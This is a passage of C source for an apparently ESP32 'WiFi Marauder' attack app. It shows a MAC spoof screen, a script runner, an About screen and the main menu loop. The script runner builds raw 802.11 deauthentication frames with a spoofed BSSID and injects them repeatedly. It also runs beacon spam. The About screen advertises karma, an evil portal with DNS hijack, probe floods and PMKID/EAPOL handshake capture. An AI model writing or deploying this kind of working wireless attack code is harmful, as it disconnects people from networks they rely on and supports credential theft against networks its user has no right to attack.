        int ev = ui_wait_event();
        if (ev == EV_BACK || ev == 99) break;
        if (ev == 1) mac_idx = (mac_idx + 1) % N_FAKE_MACS;
        if (ev == 2) {
            int ok = (wifi_set_mac(kFakeMacs[mac_idx]) == 0);
            ui_begin(); ui_title("MAC Spoof");
            ui_text(ok ? "MAC address applied!" : "Failed (radio must be idle)");
            ui_text(kFakeMacs[mac_idx]);
            ui_button("OK", 1); ui_end(); ui_wait_event();
        }
    }
    g_screen = SCR_ATTACKS_MENU;
}

// ── Scripts ───────────────────────────────────────────────────────────────────
// Simple line-based script runner. File: /data/<appid>/scripts.txt
// Commands: scan | deauth BSSID CH | beacon N | wait MS | stop

static void screen_scripts(void) {
    static char script_buf[2048];
    int n = nema_storage_fs_read_file("scripts.txt", script_buf, sizeof(script_buf) - 1);

    if (n <= 0) {
        ui_begin();
        ui_title("Scripts");
        ui_text("scripts.txt not found");
        ui_text("Create on SD card:");
        ui_text("  scan");
        ui_text("  deauth AA:BB:CC:DD:EE:FF 6");
        ui_text("  beacon 5");
        ui_text("  wait 2000");
        ui_text("  stop");
        ui_button("< Back", 1);
        ui_end();
        ui_wait_event();
        g_screen = SCR_MAIN;
        return;
    }
    script_buf[n] = '\0';

    ui_begin();
    ui_title("Run Script");
    ui_text("Found scripts.txt");
    {
        char sz[24] = "Size: ";
        int used = 6;
        str_append(sz, sizeof(sz), &used, itoa_s(n));
        str_append(sz, sizeof(sz), &used, " bytes");
        ui_text(sz);
    }
    ui_button("Run",    1);
    ui_button("< Back", 99);
    ui_end();

    int ev = ui_wait_event();
    if (ev == EV_BACK || ev == 99) { g_screen = SCR_MAIN; return; }

    // Execute line by line
    const char* p = script_buf;
    int step = 0;
    while (*p) {
        while (*p == ' ' || *p == '\t') p++;
        if (*p == '\n' || *p == '\r') { while (*p == '\n' || *p == '\r') p++; continue; }
        if (*p == '#') { while (*p && *p != '\n') p++; continue; }

        char cmd[16]; int ci = 0;
        while (*p && *p != ' ' && *p != '\n' && ci < 15) cmd[ci++] = *p++;
        cmd[ci] = '\0';
        while (*p == ' ') p++;
        step++;

        // Show progress
        ui_begin();
        {
            char hdr[32] = "Script step ";
            int used = 12;
            str_append(hdr, sizeof(hdr), &used, itoa_s(step));
            ui_title(hdr);
        }
        ui_text(cmd);
        ui_end();

        if (str_eq(cmd, "scan")) {
            static char sbuf[SCAN_BUF_SZ];
            int sn = wifi_scan(sbuf, sizeof(sbuf));
            g_ap_count = (sn > 0) ? parse_scan_results(sbuf, sn) : 0;

        } else if (str_eq(cmd, "deauth")) {
            char bssid[MAX_BSSID_LEN]; int bi = 0;
            while (*p && *p != ' ' && bi < MAX_BSSID_LEN - 1) bssid[bi++] = *p++;
            bssid[bi] = '\0'; while (*p == ' ') p++;
            int ch = 1; p = parse_int(p, &ch);
            unsigned char mac[6];
            if (parse_hex_mac(bssid, mac)) {
                unsigned char frame[26] = {
                    0xC0,0x00,0x00,0x00, 0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
                    0,0,0,0,0,0, 0,0,0,0,0,0, 0x00,0x00, 0x07,0x00 };
                nema_memcpy(frame + 10, mac, 6); nema_memcpy(frame + 16, mac, 6);
                for (int t = 0; t < 20; t++) { wifi_inject(ch, frame, 26); delay(20); }
            }

        } else if (str_eq(cmd, "beacon")) {
            int cnt = 0; p = parse_int(p, &cnt);
            if (cnt <= 0 || cnt > DEFAULT_SPAM_COUNT) cnt = DEFAULT_SPAM_COUNT;
            static const int kHop[3] = {1, 6, 11};
            for (int t = 0; t < 20; t++) {
                beacon_spam_round(kDefaultSpamSsids, cnt, kHop[t % 3]); delay(50);
            }

        } else if (str_eq(cmd, "wait")) {
            int ms = 0; p = parse_int(p, &ms);
            if (ms > 0 && ms < 60000) delay(ms);

        } else if (str_eq(cmd, "stop")) {
            // no-op: bursts above are self-contained; nothing runs in the
            // background now that attacks live in-app, not as kernel loops.
        }

        while (*p && *p != '\n') p++;
        while (*p == '\n' || *p == '\r') p++;

        int key = input_poll();
        if (key == ACT_BACK) break;
    }

    ui_begin();
    ui_title("Script Done");
    {
        char msg[32] = "Ran ";
        int used = 4;
        str_append(msg, sizeof(msg), &used, itoa_s(step));
        str_append(msg, sizeof(msg), &used, " commands");
        ui_text(msg);
    }
    ui_button("OK", 1);
    ui_end();
    ui_wait_event();
    g_screen = SCR_MAIN;
}

// ── About ─────────────────────────────────────────────────────────────────────

static int screen_about(void) {
    ui_begin();
    ui_title("WiFi Marauder");
    ui_text("Version " APP_VERSION);
    ui_text("Palanu WASM — native ESP32 radio");
    ui_text("");
    ui_text("Attacks:");
    ui_text("  Deauth, Probe Flood, badmsg, Sleep");
    ui_text("  Beacon Spam, Rickroll, Karma");
    ui_text("  Evil Portal (captive + DNS hijack)");
    ui_text("  MAC Spoof");
    ui_text("Sniff:");
    ui_text("  Beacons, Probes, Deauths, PMKID/EAPOL");
    ui_text("  PCAP save to SD card");
    ui_text("  Scripts from SD card");
    ui_text("Takes over the WiFi radio while open.");
    ui_text("");
    ui_text("Inspired by Flipper Zero Marauder");
    ui_button("Back", 1);
    ui_end();
    int ev = ui_wait_event();
    if (ev == EV_BACK || ev == 1) g_screen = SCR_MAIN;
    return ev;
}

// ── Entry point ────────────────────────────────────────────────────────────────

NEMA_EXPORT int main(void) {
    nema_log("info", "WiFiMarauder", "started v" APP_VERSION);

    // Take over the WiFi radio for the whole session. This suspends the system
    // WiFi connection once (one permission prompt) and holds the radio until the
    // app exits, so deauth/beacon/sniff/karma/portal switch instantly with no
    // disconnect/reconnect churn between them. The radio is auto-released on exit.
    wifi_acquire();

    g_screen = SCR_MAIN;

    while (1) {
        switch (g_screen) {
            case SCR_MAIN: {
                int ev = screen_main();
                if (ev == EV_BACK)          { wifi_release(); return 0; }
                if (ev == MMENU_SCAN)       g_screen = SCR_SCANNING;
                if (ev == MMENU_SNIFF)      g_screen = SCR_SNIFF_MENU;
                if (ev == MMENU_ATTACKS)    g_screen = SCR_ATTACKS_MENU;
                if (ev == MMENU_SCRIPTS)    g_screen = SCR_SCRIPTS;
                if (ev == MMENU_ABOUT)      g_screen = SCR_ABOUT;
                break;
            }
            case SCR_SCANNING:       screen_scanning();       break;
            case SCR_AP_LIST:        screen_ap_list();        break;
            case SCR_AP_DETAIL:      screen_ap_detail();      break;
            case SCR_DEAUTHING:      screen_deauthing();      break;
            case SCR_PROBE_FLOOD:    screen_probe_flood();    break;
            case SCR_SIGNAL_MON:     screen_signal_mon();     break;
            case SCR_MONITORING:     screen_monitoring();     break;
            case SCR_SNIFF_MENU:     screen_sniff_menu();     break;
            case SCR_SNIFF_BEACONS:  screen_sniff_beacons();  break;
            case SCR_SNIFF_PROBES:   screen_sniff_probes();   break;
            case SCR_SNIFF_DEAUTHS:  screen_sniff_deauths();  break;
            case SCR_SNIFF_PMKID:    screen_sniff_pmkid();    break;
            case SCR_BEACON_SPAM:    screen_beacon_spam();    break;
            case SCR_RICKROLLING:    screen_rickrolling();    break;
            case SCR_ABOUT:          screen_about();          break;
            case SCR_ATTACKS_MENU:   screen_attacks_menu();   break;
            case SCR_MAC_SPOOF:      screen_mac_spoof();      break;
            case SCR_KARMA:          screen_karma();          break;
            case SCR_EVIL_PORTAL:    screen_evil_portal();    break;
            case SCR_SCRIPTS:        screen_scripts();        break;
            default: g_screen = SCR_MAIN; break;
        }
    }
}
